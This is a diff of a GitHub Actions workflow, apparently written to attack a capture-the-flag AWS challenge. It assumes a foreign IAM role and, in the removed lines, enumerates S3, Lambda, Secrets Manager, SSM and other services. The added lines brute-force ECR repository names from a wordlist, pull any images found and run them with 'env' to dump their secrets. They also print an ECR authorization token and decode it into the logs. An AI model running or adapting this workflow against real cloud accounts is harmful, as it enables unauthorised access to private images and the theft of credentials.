@@ -1,4 +1,4 @@
-name: Explore AWS Permissions
+name: Try Specific ECR Repositories
 on: [push]
 
 jobs:
@@ -14,58 +14,62 @@ jobs:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: us-east-1
           
-      - name: Check Current Identity
+      - name: Try Common ECR Repository Names
         run: |
-          aws sts get-caller-identity
-
-      - name: Try Various AWS Services
-        run: |
-          # S3 - List buckets and contents
-          echo "=== Checking S3 ==="
-          aws s3 ls || echo "No S3 list access"
+          # Common CTF/Challenge repository names
+          REPOS=(
+            "imaginary-challenge"
+            "challenge"
+            "ctf"
+            "flag"
+            "secret"
+            "app"
+            "web"
+            "api"
+            "backend"
+            "frontend"
+            "database"
+            "imaginary"
+            "2025-imagine"
+            "team1"
+            "empasoft"
+          )
           
-          # Lambda functions
-          echo "=== Checking Lambda ==="
-          aws lambda list-functions || echo "No Lambda access"
-          
-          # EC2 instances
-          echo "=== Checking EC2 ==="
-          aws ec2 describe-instances --max-items 5 || echo "No EC2 access"
-          
-          # Secrets Manager
-          echo "=== Checking Secrets Manager ==="
-          aws secretsmanager list-secrets --max-results 10 || echo "No Secrets Manager access"
-          
-          # SSM Parameter Store
-          echo "=== Checking SSM Parameters ==="
-          aws ssm describe-parameters --max-results 10 || echo "No SSM access"
-          
-          # CloudFormation
-          echo "=== Checking CloudFormation ==="
-          aws cloudformation list-stacks --max-results 10 || echo "No CloudFormation access"
-          
-          # ECR - Even if empty, try different regions
-          echo "=== Checking ECR in different regions ==="
-          for region in us-east-1 us-west-2 eu-west-1; do
-            echo "Region: $region"
-            aws ecr describe-repositories --region $region || echo "No access in $region"
+          for repo in "${REPOS[@]}"; do
+            echo "=== Trying repository: $repo ==="
+            # Try to list images in the repository
+            aws ecr list-images --repository-name $repo --max-results 1 2>/dev/null && echo "✅ FOUND: $repo" || echo "❌ Not found: $repo"
           done
 
-      - name: Try ECR Operations Anyway
+      - name: If Found, Pull and Explore Images
         run: |
-          # Even if no repos visible, try common ECR operations
-          echo "=== Attempting ECR operations ==="
-          # Try to create a test repository (might fail but could reveal permissions)
-          aws ecr create-repository --repository-name test-probe --image-scanning-configuration scanOnPush=true || echo "Cannot create repos"
-          
-          # Try to get authorization token with different regions
-          aws ecr get-authorization-token --output text || echo "Cannot get auth token"
+          # If any repository worked above, pull its images
+          # Try the most likely names
+          for repo in imaginary-challenge challenge ctf flag; do
+            echo "Attempting to pull from $repo"
+            # Get available image tags
+            TAGS=$(aws ecr list-images --repository-name $repo --query 'imageIds[].imageTag' --output text 2>/dev/null)
+            if [ ! -z "$TAGS" ]; then
+              echo "Found tags in $repo: $TAGS"
+              for tag in $TAGS; do
+                echo "Pulling $repo:$tag"
+                docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:$tag
+                echo "=== Inspecting $repo:$tag ==="
+                docker images | grep $repo
+                # Try to run the image and explore
+                docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:$tag env || echo "Cannot run, trying other methods"
+              done
+            fi
+          done
 
-      - name: Explore Environment
+      - name: Decode and Use ECR Auth Token
         run: |
-          # Check if there are any environment variables or metadata
-          echo "=== Environment Info ==="
-          env | grep -i aws
-          echo "=== Current directory ==="
-          pwd
-          ls -la
+          # The auth token from previous runs is base64 encoded
+          # Let's decode it and see what's inside
+          echo "=== ECR Authorization Token ==="
+          AUTH_TOKEN=$(aws ecr get-authorization-token --output text --query 'authorizationData[].authorizationToken')
+          echo "Token: $AUTH_TOKEN"
+          
+          # Decode the base64 token
+          echo "$AUTH_TOKEN" | base64 -d
+          echo
